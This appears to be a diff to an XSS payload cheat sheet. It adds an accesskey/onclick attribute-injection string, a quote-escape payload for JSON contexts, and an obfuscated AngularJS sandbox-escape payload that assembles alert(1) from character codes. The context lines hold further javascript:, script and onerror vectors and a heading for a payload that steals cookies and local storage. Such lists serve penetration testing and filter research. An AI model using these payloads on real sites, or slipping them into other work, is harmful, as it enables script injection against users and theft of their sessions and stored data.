@@ -8,6 +8,7 @@ javascript:alert(document.domain)
 %20javascript:alert()
 <script/src=
 <img/src/onerror=...>
+?%27accesskey=%27x%27onclick=%27alert(1)
 ```
 
 ```js
@@ -86,7 +87,9 @@ Here is An XSS payload that steals both Cookies and Local Storage Data:
 ────────────────────────────────────────────
 json escape xss
 \"-alert(1)}//
+\'-alert(1)//
 ────────────────────────────────────────────
+asdf&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 ```
 ---
 ```js
